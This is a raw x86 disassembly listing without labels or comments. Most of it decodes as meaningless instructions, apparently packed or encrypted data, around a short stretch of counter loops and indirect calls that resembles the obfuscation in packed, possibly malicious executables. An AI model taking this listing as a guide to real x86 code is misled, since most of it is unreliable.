  40a9cd:	in     al,0x61
  40a9cf:	xchg   ebp,eax
  40a9d0:	inc    DWORD PTR [edx+0x7d82562a]
  40a9d6:	xlat   BYTE PTR ds:[ebx]
  40a9d7:	(bad)  
  40a9d8:	sub    edx,DWORD PTR [ecx]
  40a9da:	fst    DWORD PTR [edi-0x7774ea61]
  40a9e0:	test   eax,0x45f5c8fc
  40a9e5:	sub    cl,BYTE PTR [edi+esi*2+0x6ec6c405]
  40a9ec:	adc    ecx,DWORD PTR [esp+ebx*1-0x69044559]
  40a9f3:	xchg   ecx,eax
  40a9f4:	xchg   DWORD PTR [eax+ebp*2+0x1b446a28],eax
  40a9fb:	mov    ah,0x40
  40a9fd:	inc    esp
  40a9fe:	push   ss
  40a9ff:	in     al,dx
  40aa00:	and    ecx,edi
  40aa02:	shl    BYTE PTR [ecx-0x50],0xc5
  40aa06:	nop
  40aa07:	dec    ebx
  40aa08:	inc    edi
  40aa09:	lds    edx,FWORD PTR [edi-0x5bae7d4e]
  40aa0f:	push   es
  40aa10:	adc    al,dl
  40aa12:	das    
  40aa13:	push   edi
  40aa14:	pop    esp
  40aa15:	shl    BYTE PTR [edi-0x2ac0f708],0x8a
  40aa1c:	inc    esp
  40aa1d:	cli    
  40aa1e:	xchg   bh,bh
  40aa20:	sub    ebp,eax
  40aa22:	inc    esp
  40aa23:	test   DWORD PTR [edx-0x31d50238],ecx
  40aa29:	out    dx,al
  40aa2a:	das    
  40aa2b:	push   ds
  40aa2c:	dec    ebx
  40aa2d:	sbb    eax,0xbc78d4c1
  40aa32:	add    esp,esp
  40aa34:	loopne 0x40aa2a
  40aa36:	mov    edx,0x8de3f96b
  40aa3b:	pop    es
  40aa3c:	and    DWORD PTR [edx],0x48
  40aa3f:	cmp    eax,0x313bdd01
  40aa44:	and    eax,0x510bf3e8
  40aa49:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40aa4b:	push   cs
  40aa4c:	inc    ebp
  40aa4d:	adc    BYTE PTR [ecx-0x6dbd39ab],0xc
  40aa54:	repnz (bad) 
  40aa56:	mov    WORD PTR [eax],fs
  40aa58:	arpl   WORD PTR [eax+0x63a8aa4e],si
  40aa5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa5f:	mov    ebx,fs
  40aa61:	and    al,0xb
  40aa63:	and    al,0x50
  40aa65:	pop    ebx
  40aa66:	ret    0x262e
  40aa69:	imul   esi,DWORD PTR [ecx+eax*4+0x11],0xe53cd6dc
  40aa71:	int3   
  40aa72:	dec    ebp
  40aa73:	sbb    bh,BYTE PTR [ebx-0x39]
  40aa76:	test   al,0x12
  40aa78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa79:	dec    eax
  40aa7a:	adc    DWORD PTR [ebx],0x50
  40aa7d:	xchg   edx,eax
  40aa7e:	loop   0x40aa91
  40aa80:	cli    
  40aa81:	shl    DWORD PTR [edx],0x7a
  40aa84:	sub    DWORD PTR [esi-0xe],ebx
  40aa87:	sub    al,0xd3
  40aa89:	and    al,0x8c
  40aa8b:	or     ah,BYTE PTR [ecx+eax*1-0xa]
  40aa8f:	pop    edi
  40aa90:	inc    esi
  40aa91:	test   eax,0x68dd22da
  40aa96:	popa   
  40aa97:	mov    bh,0x71
  40aa99:	xlat   BYTE PTR ds:[ebx]
  40aa9a:	or     cl,BYTE PTR ds:0x5862fc1e
  40aaa0:	das    
  40aaa1:	push   es
  40aaa2:	daa    
  40aaa3:	call   0x1d87:0xa6a9749e
  40aaaa:	cmc    
  40aaab:	(bad)  
  40aaad:	push   eax
  40aaae:	inc    ebx
  40aaaf:	xor    BYTE PTR [esi+0x4f],ah
  40aab2:	or     DWORD PTR [ecx+0x7b],eax
  40aab5:	adc    eax,0x93b3c91d
  40aaba:	inc    esp
  40aabb:	sbb    eax,0x129958fc
  40aac0:	push   0x40
  40aac2:	cs mov ecx,0x4dc264ff
  40aac8:	outs   dx,DWORD PTR ds:[esi]
  40aac9:	lods   eax,DWORD PTR ds:[esi]
  40aaca:	sub    ebx,edi
  40aacc:	int    0x9c
  40aace:	loopne 0x40aa8f
  40aad0:	mov    dl,bh
  40aad2:	xchg   DWORD PTR [eax-0x40ed5db8],ebp
  40aad8:	cmp    eax,0x48944976
  40aadd:	pop    ecx
  40aade:	add    eax,0x756e06f1
  40aae3:	imul   ebx,DWORD PTR [edx+0x55ce6a3f],0x5207db5e
  40aaed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaee:	cmp    eax,0xd750cf93
  40aaf3:	jbe    0x40ab17
  40aaf5:	cmp    DWORD PTR [ecx],ecx
  40aaf7:	js     0x40aad6
  40aaf9:	sbb    edx,DWORD PTR [esi-0x6f982b72]
  40aaff:	nop
  40ab00:	movzx  ecx,BYTE PTR [ecx-0x1e709e8b]
  40ab07:	lea    ecx,[edi]
  40ab09:	loope  0x40aa99
  40ab0b:	or     ch,BYTE PTR [ebp+0xec1036e]
  40ab11:	fs and edx,esp
  40ab14:	xchg   DWORD PTR [ecx+0x38],esi
  40ab17:	mov    dh,0xd3
  40ab19:	sbb    ebx,DWORD PTR [edx+0x6b]
  40ab1c:	mov    edi,0xc7d63d2e
  40ab21:	push   eax
  40ab22:	pop    eax
  40ab23:	sub    DWORD PTR ds:0x8142fd8b,ebp
  40ab29:	ret    
  40ab2a:	and    eax,0x583c9458
  40ab2f:	mov    ch,0xf3
  40ab31:	push   es
  40ab32:	(bad)  
  40ab33:	cld    
  40ab34:	inc    ebp
  40ab35:	jnp    0x40aac4
  40ab37:	scas   eax,DWORD PTR es:[edi]
  40ab38:	xchg   ebp,eax
  40ab39:	xchg   esp,eax
  40ab3a:	fild   WORD PTR [eax+0x72e7a46f]
  40ab40:	pusha  
  40ab41:	and    DWORD PTR [edx+0x1f],0x52
  40ab45:	xor    BYTE PTR [edx+0x2e],0xba
  40ab49:	sub    al,0xcd
  40ab4b:	test   al,0xfd
  40ab4d:	dec    edi
  40ab4e:	sbb    eax,0x4e9072a7
  40ab53:	mov    WORD PTR [eax],gs
  40ab55:	sub    ah,BYTE PTR [edi]
  40ab57:	loope  0x40ab5b
  40ab59:	sub    ebx,DWORD PTR [ebx+0x4a1bce52]
  40ab5f:	push   ss
  40ab60:	add    bl,cl
  40ab62:	mov    esp,0x897529ce
  40ab67:	cmp    BYTE PTR [ecx],bh
  40ab69:	(bad)  
  40ab6a:	out    dx,al
  40ab6b:	push   esp
  40ab6c:	scas   al,BYTE PTR es:[edi]
  40ab6d:	sbb    DWORD PTR [edx+edi*2],esp
  40ab70:	lods   al,BYTE PTR ds:[esi]
  40ab71:	data16 ror BYTE PTR [ecx],cl
  40ab74:	sbb    DWORD PTR ds:[ebx],edi
  40ab77:	dec    ebp
  40ab78:	ins    BYTE PTR es:[edi],dx
  40ab79:	les    ebp,FWORD PTR [edx]
  40ab7b:	aam    0x73
  40ab7d:	cli    
  40ab7e:	into   
  40ab7f:	sti    
  40ab80:	into   
  40ab81:	jno    0x40abf2
  40ab83:	and    cl,BYTE PTR [edx]
  40ab85:	in     al,0x75
  40ab87:	add    eax,0x37d40f18
  40ab8c:	test   BYTE PTR ds:0xd11a0a1b,0xa1
  40ab93:	outs   dx,DWORD PTR ds:[esi]
  40ab94:	inc    edx
  40ab95:	gs cdq 
  40ab97:	into   
  40ab98:	jnp    0x40ab62
  40ab9a:	pop    eax
  40ab9b:	jno    0x40ac1a
  40ab9d:	or     eax,0xc90d8d18
  40aba2:	inc    ebx
  40aba3:	mov    ebp,0x18fb9bb1
  40aba8:	sbb    dh,BYTE PTR [eax-0xc]
  40abab:	jnp    0x40ab63
  40abad:	xchg   edi,eax
  40abae:	add    BYTE PTR [eax+eax*1-0x37],cl
  40abb2:	xchg   edx,eax
  40abb3:	mov    edi,0x3928e34b
  40abb8:	jmp    0x7173:0x4caf56b7
  40abbf:	popa   
  40abc0:	mov    ah,0xf4
  40abc2:	push   ebx
  40abc3:	xchg   BYTE PTR [ebx+esi*4],ah
  40abc6:	pop    eax
  40abc7:	and    al,0x25
  40abc9:	sbb    BYTE PTR [ebp-0x44e3469c],ch
  40abcf:	mov    bl,0x7c
  40abd1:	xor    eax,DWORD PTR [eax+0x18ac728e]
  40abd7:	pop    esi
  40abd8:	cwde   
  40abd9:	fld    QWORD PTR [esi]
  40abdb:	ins    DWORD PTR es:[edi],dx
  40abdc:	sahf   
  40abdd:	std    
  40abde:	arpl   WORD PTR [eax],di
  40abe0:	jnp    0x40ac4d
  40abe2:	and    DWORD PTR [ecx],esi
  40abe4:	mov    ebp,0x118b667d
  40abe9:	add    esi,esi
  40abeb:	jb     0x40ab73
  40abed:	pop    esi
  40abee:	test   BYTE PTR [ebp-0x20f70e53],0x62
  40abf5:	push   ecx
  40abf6:	daa    
  40abf7:	mov    gs,WORD PTR fs:[ebp+edx*4+0x4eb56ce1]
  40abff:	pop    esi
  40ac00:	xor    edx,eax
  40ac02:	xor    DWORD PTR ds:0x42fcf5,0x42e70f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e703,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ada4
  40adb4:	jmp    0x40ad56
  40adb6:	mov    edx,0x7070fd03
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad43
  40adc0:	jp     0x40ae2f
  40adc2:	xchg   ecx,eax
  40adc4:	add    ebp,DWORD PTR [edi-0x129bd954]
  40adca:	iret   
  40adcb:	shl    dl,1
  40adcd:	xor    cl,BYTE PTR [ebx]
  40adcf:	bound  ebx,QWORD PTR fs:[ebx+0x7115c530]
  40add6:	mov    al,0x9a
  40add8:	imul   edi,ebx,0xffffff9f
  40addb:	push   edx
  40addc:	stos   DWORD PTR es:[edi],eax
  40addd:	add    ebp,edx
  40addf:	and    ebx,DWORD PTR [ecx+ebx*1]
  40ade2:	sbb    dl,BYTE PTR [edx+0x676d65ba]
  40ade8:	xchg   edi,eax
  40ade9:	jae    0x40ad95
  40adeb:	sub    al,0xc6
  40aded:	jle    0x40ae2f
  40adef:	pop    edi
  40adf0:	sti    
  40adf1:	out    dx,eax
  40adf2:	out    0x52,al
  40adf4:	mov    eax,ds:0x5ab4b316
  40adf9:	fs test al,0xb7
  40adfc:	push   0x5468865c
  40ae01:	addr16 ds (bad) 
  40ae04:	psrad  mm7,QWORD PTR [eax]
  40ae07:	(bad)  
  40ae08:	(bad)  
  40ae09:	sti    
  40ae0a:	shl    BYTE PTR [edi-0x2a9685bf],0x46
  40ae11:	mov    edi,0x7b87aceb
  40ae16:	mov    eax,0x37ebf9cb
  40ae1b:	repz jp 0x40ae2d
  40ae1e:	cdq    
  40ae1f:	hlt    
  40ae20:	fimul  WORD PTR [esi]
  40ae22:	sbb    eax,0xcfd64636
  40ae27:	fsubr  QWORD PTR [edi+0x6b]
  40ae2a:	popf   
  40ae2b:	out    dx,al
  40ae2c:	imul   esi,ecx,0xdbc5e7fe
  40ae32:	cmp    bh,0xd
  40ae35:	or     bl,bh
  40ae37:	cmp    dh,BYTE PTR [edx]
  40ae39:	mov    BYTE PTR [esi+0x27569a32],bl
  40ae3f:	aad    0xde
  40ae41:	jle    0x40aebd
  40ae43:	jne    0x40aea1
  40ae45:	mov    cl,0x93
  40ae47:	cld    
  40ae48:	jnp    0x40adf1
  40ae4a:	ds xchg esi,eax
  40ae4c:	std    
  40ae4d:	inc    eax
  40ae4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae4f:	pop    ss
  40ae50:	(bad)  
  40ae52:	stc    
  40ae53:	pop    edx
  40ae54:	imul   ebp,edi,0xcc903e46
  40ae5a:	repz dec ebx
  40ae5c:	mov    ds:0x31f917ef,eax
  40ae61:	xor    al,0x22
  40ae63:	push   ebp
  40ae64:	lock mov al,0x91
  40ae67:	fist   DWORD PTR [esi+0x35]
  40ae6a:	ins    DWORD PTR es:[edi],dx
  40ae6b:	push   ss
  40ae6c:	pop    ss
  40ae6d:	retf   0xb6cf
  40ae70:	lods   eax,DWORD PTR ds:[esi]
  40ae71:	jbe    0x40ae27
  40ae73:	gs dec esp
  40ae75:	mov    WORD PTR [edx-0x7a],?
  40ae78:	adc    ebp,ebp
  40ae7a:	sar    ebx,cl
  40ae7c:	cmp    BYTE PTR [ecx-0x13],al
  40ae7f:	aam    0x81
  40ae81:	shr    BYTE PTR [edx-0x1a3eabba],0xd5
  40ae88:	mov    ecx,0xf6b26d19
  40ae8d:	or     BYTE PTR [ebp-0x5993d544],dh
  40ae93:	cs out 0x32,eax
  40ae96:	jo     0x40ae2c
  40ae98:	pop    ecx
  40ae99:	adc    BYTE PTR [ebx],0xad
  40ae9c:	push   eax
  40ae9d:	cmp    al,BYTE PTR ds:0xf9784d14
  40aea3:	adc    BYTE PTR [esi-0x64a53c79],0xae
  40aeaa:	jne    0x40ae7d
  40aeac:	in     eax,dx
  40aead:	push   esi
  40aeae:	rcr    BYTE PTR [ecx+ebp*8],cl
  40aeb1:	cmp    bh,BYTE PTR [esi+0x5e]
  40aeb4:	or     ah,dl
  40aeb6:	inc    ebp
  40aeb7:	xor    BYTE PTR [eax],bl
  40aeb9:	mov    edi,0x9a0c9de3
  40aebe:	mov    bl,BYTE PTR [esi-0x6159eb21]
  40aec4:	sub    DWORD PTR [ecx-0x7aeca8b1],esp
  40aeca:	or     bl,BYTE PTR [ecx]
  40aecc:	pop    edi
  40aecd:	xchg   edi,eax
  40aece:	mov    ebp,0x7f85afaa
  40aed3:	sbb    ah,BYTE PTR [ebp+0x5c4ba8dd]
  40aed9:	push   0xffffff86
  40aedb:	sbb    BYTE PTR [ebp+0x37a52912],ah
  40aee1:	or     ebp,ebx
  40aee3:	int3   
  40aee4:	and    BYTE PTR [ebx],al
  40aee6:	mov    ecx,0x720cfc14
  40aeeb:	aaa    
  40aeec:	and    esp,esi
  40aeee:	push   0x53efc88b
  40aef3:	pop    ebp
  40aef4:	aad    0x4a
  40aef6:	dec    edi
  40aef7:	pop    ecx
  40aef8:	inc    esp
  40aef9:	add    BYTE PTR [edi],0xff
  40aefc:	sbb    eax,0xf16ee0e8
  40af01:	adc    dh,BYTE PTR [eax-0x4f]
  40af04:	add    ecx,DWORD PTR [eax]
  40af06:	inc    ecx
  40af07:	outs   dx,DWORD PTR ds:[esi]
  40af08:	aaa    
  40af09:	lahf   
  40af0a:	and    al,0xf0
  40af0c:	gs jbe 0x40af48
  40af0f:	and    BYTE PTR [edx+0x64],dh
  40af12:	add    edx,DWORD PTR [ecx]
  40af14:	outs   dx,DWORD PTR ds:[esi]
  40af15:	(bad)  
  40af16:	dec    ebp
  40af17:	inc    esp
  40af18:	mov    ebx,0xab56a63f
  40af1d:	mov    ds,WORD PTR [edx]
  40af1f:	adc    eax,0x85e2fce9
  40af24:	sbb    eax,0x313013b1
  40af29:	loopne 0x40af75
  40af2b:	inc    eax
  40af2c:	inc    edx
  40af2d:	xor    al,0xd0
  40af2f:	sub    eax,0x73ee3ee
  40af34:	jb     0x40aec0
  40af36:	push   edx
  40af37:	xchg   ebx,eax
  40af38:	in     al,0xcc
  40af3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af3b:	xchg   ecx,eax
  40af3c:	xchg   ebx,eax
  40af3d:	and    ebp,DWORD PTR ss:[ebx]
  40af40:	in     eax,0x24
  40af42:	inc    ebp
  40af43:	in     al,0xa
  40af45:	mov    bh,0xd8
  40af47:	mov    bp,0x5d1e
  40af4b:	shl    BYTE PTR [ecx+0x41],1
  40af4e:	sti    
  40af4f:	jmp    0xa210cbfe
  40af54:	mov    edx,DWORD PTR [ebp-0x1b26402f]
  40af5a:	push   ss
  40af5b:	les    ebp,FWORD PTR [edx+0x4e]
  40af5e:	add    al,0xf2
  40af60:	inc    ebp
  40af61:	push   eax
  40af62:	adc    DWORD PTR ds:0x73b645df,esp
  40af68:	adc    BYTE PTR [eax-0x4c],0x73
  40af6c:	ja     0x40af89
  40af6e:	jns    0x40af16
  40af70:	enter  0x76c5,0xcf
  40af74:	leave  
  40af75:	cmp    al,0x6f
  40af77:	sbb    BYTE PTR [ebx-0x2ec779b7],bl
  40af7d:	out    0xe2,al
  40af7f:	mov    ecx,0xfcb51cf
  40af84:	int    0xff
  40af86:	(bad)  
  40af87:	mov    ebp,0x96a442db
  40af8c:	inc    ebx
  40af8d:	add    eax,0xcac1e573
  40af92:	loop   0x40afb7
  40af94:	loope  0x40afb3
  40af96:	inc    eax
  40af97:	lea    edi,[ebp+0x530dae8c]
  40af9d:	fild   DWORD PTR [ebx+0x16]
  40afa0:	sub    DWORD PTR [ecx+0x7f5938f2],0x21944396
  40afaa:	std    
  40afab:	in     eax,0x3f
  40afad:	or     dh,BYTE PTR [esi-0x5e9d82b0]
  40afb3:	outs   dx,DWORD PTR ds:[esi]
  40afb4:	retf   
  40afb5:	sub    eax,0xe7f8b44c
  40afba:	nop
  40afbb:	scas   eax,DWORD PTR es:[edi]
  40afbc:	div    BYTE PTR [ebp-0x5e]
  40afbf:	dec    ebp
  40afc0:	lock cld 
  40afc2:	adc    ebp,DWORD PTR [edi]
  40afc4:	addr16 jg 0x40b00e
  40afc7:	jo     0x40afc6
  40afc9:	into   
  40afca:	out    0x57,eax
  40afcc:	in     al,0xc0
  40afce:	aam    0x56
  40afd0:	in     eax,0x48
  40afd2:	xchg   esp,eax
  40afd3:	push   0xffffff82
  40afd5:	sbb    al,0xdc
  40afd7:	jae    0x40b039
  40afd9:	test   al,0xe5
  40afdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afdc:	xor    ecx,DWORD PTR [ecx]
  40afde:	repz jg 0x40af81
  40afe1:	sbb    DWORD PTR [esi+0x6c],ebx
  40afe4:	mov    edx,0xc1b4466e
  40afe9:	jns    0x40afd5
  40afeb:	lds    esp,FWORD PTR [eax+0x2c]
  40afee:	push   esp
  40afef:	pop    esi
  40aff0:	push   ss
  40aff1:	in     al,dx
  40aff2:	jmp    0xec3c3ea9
  40aff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aff8:	mov    bh,0xe1
  40affa:	and    esp,DWORD PTR [ebp-0x1665bb81]
  40b000:	inc    ebp
  40b001:	mov    al,ds:0xf1d5732b
  40b006:	clc    
  40b007:	imul   esi,DWORD PTR [esi+0x70fce25a],0x9c0f0d02
  40b011:	fs push esi
  40b013:	mov    eax,ds:0x35be313d
  40b018:	cld    
  40b019:	jecxz  0x40afff
  40b01b:	xor    dl,dl
  40b01d:	jns    0x40b09e
  40b01f:	cmp    DWORD PTR [ecx],0xffffffda
  40b022:	or     edi,0xc76116d1
  40b028:	xlat   BYTE PTR ds:[ebx]
  40b029:	stos   BYTE PTR es:[edi],al
  40b02a:	adc    esi,DWORD PTR [eax+0x54]
  40b02d:	lock mov ?,WORD PTR [edi]
  40b030:	and    al,0x79
  40b032:	in     al,0x90
  40b034:	stos   DWORD PTR es:[edi],eax
  40b035:	das    
  40b036:	outs   dx,DWORD PTR ds:[esi]
  40b037:	std    
  40b038:	out    dx,al
  40b039:	xchg   esp,eax
  40b03a:	or     ah,dl
  40b03c:	xlat   BYTE PTR ds:[ebx]
  40b03d:	inc    edi
  40b03e:	cmp    eax,0x60b8fecf
  40b043:	pop    esp
  40b044:	jecxz  0x40b031
  40b046:	popa   
  40b047:	lods   eax,DWORD PTR ds:[esi]
  40b048:	xor    edi,0xfffffffe
  40b04b:	and    eax,0xeece8867
  40b050:	mov    esp,0x8df4f763
  40b055:	mov    fs,WORD PTR [esi+0x4a]
  40b058:	adc    eax,0x6a74d322
  40b05d:	or     eax,0xe54022cb
  40b062:	dec    ecx
  40b063:	in     al,0x51
  40b065:	sbb    bh,BYTE PTR ds:[ebx+eax*8]
  40b069:	cdq    
  40b06a:	mov    ds:0x31a20e89,eax
  40b06f:	xchg   edx,eax
  40b070:	(bad)  
  40b071:	in     eax,dx
  40b072:	add    edi,DWORD PTR [edx-0x45]
  40b075:	jl     0x40b0bb
  40b077:	ds and eax,0x2d9b90f1
  40b07d:	push   cs
  40b07e:	push   ebx
  40b07f:	and    al,0xd9
  40b081:	repz sbb ebp,DWORD PTR [ecx]
  40b084:	jmp    0x67b2107c
  40b089:	push   0x525abdc0
  40b08e:	leave  
  40b08f:	inc    edx
  40b090:	dec    ecx
  40b091:	retf   0x7e98
  40b094:	out    dx,eax
  40b095:	loopne 0x40b075
  40b097:	mov    cl,0x2b
  40b099:	xchg   ebp,eax
  40b09a:	xor    al,0xfb
  40b09c:	fistp  DWORD PTR [esi-0x52d0d350]
  40b0a2:	or     BYTE PTR [ecx],bl
  40b0a4:	cli    
  40b0a5:	sbb    BYTE PTR ds:0x4832765f,cl
  40b0ab:	test   BYTE PTR [esi-0x78],ah
  40b0ae:	nop
  40b0af:	mov    BYTE PTR [eax-0x51339457],ah
  40b0b5:	push   es
  40b0b6:	xchg   ebx,eax
  40b0b7:	ins    DWORD PTR es:[edi],dx
  40b0b8:	ja     0x40b0f9
  40b0ba:	xor    DWORD PTR [edx],ebp
  40b0bc:	jb     0x40b0f6
  40b0be:	jno    0x40b0fa
  40b0c0:	xor    BYTE PTR [esi+0x7113126a],ch
  40b0c6:	ror    ebx,0x54
  40b0c9:	test   eax,0x1a16d948
  40b0ce:	mov    edx,0xb13c6f34
  40b0d3:	cli    
  40b0d4:	das    
  40b0d5:	loop   0x40b06f
  40b0d7:	push   esp
  40b0d8:	mov    esp,0x547894bf
  40b0dd:	push   ss
  40b0de:	dec    esi
  40b0df:	ss xchg edx,eax
  40b0e1:	xor    DWORD PTR [ecx+0x3a],esi
  40b0e4:	test   eax,0x30f2a448
  40b0e9:	adc    al,0x16
  40b0eb:	pop    eax
  40b0ec:	mov    bl,0x3b
  40b0ee:	cli    
  40b0ef:	sbb    eax,0x6f60afd0
  40b0f4:	lods   eax,DWORD PTR ds:[esi]
  40b0f5:	add    al,0xcb
  40b0f7:	xor    eax,0x806cbb45
  40b0fc:	(bad)  
  40b0fd:	jmp    0x40b154
  40b0ff:	push   ss
  40b100:	mov    WORD PTR [ebp+0x76],?
  40b103:	imul   esp,DWORD PTR [ebp+0x4e75ad19],0x9
  40b10a:	pop    ebx
  40b10b:	jmp    0xe778ff1a
  40b110:	pop    ebx
  40b111:	cmp    al,BYTE PTR [ebx]
  40b113:	and    ch,al
  40b115:	in     al,0x79
  40b117:	push   ecx
  40b118:	xchg   esp,eax
  40b119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b11a:	and    DWORD PTR [ebp+0x4ac7a6c2],0xf9fb2864
  40b124:	repz pop ebp
  40b126:	sub    ecx,ebx
  40b128:	adc    bh,dl
  40b12a:	mov    ecx,0xa810cd10
  40b12f:	sbb    BYTE PTR [ebp-0x47],dh
  40b132:	retf   0x7fa
  40b135:	jnp    0x40b0e3
  40b137:	fsubrp st(5),st
  40b139:	lock call 0x2cbf:0x915870c4
  40b141:	adc    al,0x39
  40b143:	cmp    esp,DWORD PTR [eax]
  40b145:	iret   
  40b146:	and    eax,0x7909a4f8
  40b14b:	xchg   ebp,eax
  40b14c:	jne    0x40b1a9
  40b14e:	jge    0x40b178
  40b150:	jmp    0x40b10e
  40b152:	mov    ds:0x93702aba,eax
  40b157:	(bad)  
  40b158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b159:	xchg   ebp,eax
  40b15a:	dec    ecx
  40b15b:	cdq    
  40b15c:	repnz stos DWORD PTR es:[edi],eax
  40b15e:	push   es
  40b15f:	rol    DWORD PTR [ebx],0xd1
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	shl    BYTE PTR [ebx-0x55db5e4],0x70
  40b17a:	jo     0x40b11b
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b15e
  40b180:	xlat   BYTE PTR ds:[ebx]
  40b181:	mov    dl,0xb
  40b183:	and    eax,0x552565f5
  40b188:	xchg   edx,eax
  40b189:	dec    ebx
  40b18a:	daa    
  40b18b:	push   ebx
  40b18c:	inc    eax
  40b18d:	rol    BYTE PTR [eax],0xe6
  40b190:	aaa    
  40b191:	jmp    0x40b1f9
  40b193:	sub    al,0x23
  40b195:	(bad)  
  40b196:	lods   eax,DWORD PTR ds:[esi]
  40b197:	cmp    al,0x2b
  40b199:	outs   dx,BYTE PTR ds:[esi]
  40b19a:	lock push edi
  40b19c:	sub    DWORD PTR [edx],ebx
  40b19e:	xchg   esp,eax
  40b19f:	ror    DWORD PTR [ecx],1
  40b1a1:	dec    ebp
  40b1a2:	sti    
  40b1a3:	imul   esi,DWORD PTR [ebx+eiz*4],0x6cd24f06
  40b1aa:	pop    eax
  40b1ab:	cmc    
  40b1ac:	je     0x40b14f
  40b1ae:	ror    BYTE PTR [ecx],0x4f
  40b1b1:	stc    
  40b1b2:	mov    BYTE PTR [ebx-0x3],cl
  40b1b5:	push   0x8a4ad4cc
  40b1ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1bb:	(bad)  
  40b1be:	sub    ebp,DWORD PTR [edx+eax*1]
  40b1c1:	sbb    cl,BYTE PTR [edx]
  40b1c3:	in     eax,0x92
  40b1c5:	cmc    
  40b1c6:	outs   dx,DWORD PTR ds:[esi]
  40b1c7:	mov    ds:0x6eff7812,al
  40b1cc:	push   es
